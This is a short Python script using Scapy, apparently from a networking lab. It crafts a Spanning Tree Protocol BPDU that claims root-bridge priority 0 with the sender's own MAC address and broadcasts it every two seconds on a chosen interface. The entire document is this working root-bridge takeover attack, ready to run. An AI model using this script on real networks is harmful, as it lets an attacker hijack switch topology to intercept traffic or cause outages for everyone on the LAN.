from scapy.all import *

#download computer MAC
iface = "Ethernet"  # Zmień na nazwę swojego interfejsu
my_mac = get_if_hwaddr(iface)

#STP frame
stp_frame = (
    Ether(dst="01:80:C2:00:00:00", src=my_mac, type=0x0026) /
    LLC(dsap=0x42, ssap=0x42, ctrl=3) /
    STP(
        proto=0, version=0, bpdutype=0, bpduflags=0,
        rootid=0, rootmac=my_mac, pathcost=0,
        bridgeid=0, bridgemac=my_mac, portid=0x8001,
        age=0, maxage=20, hellotime=2, fwddelay=15
    )
)

#sending STP frame every 2s
print(f"Using Source MAC: {my_mac}")
sendp(stp_frame, iface=iface, loop=1, inter=2)
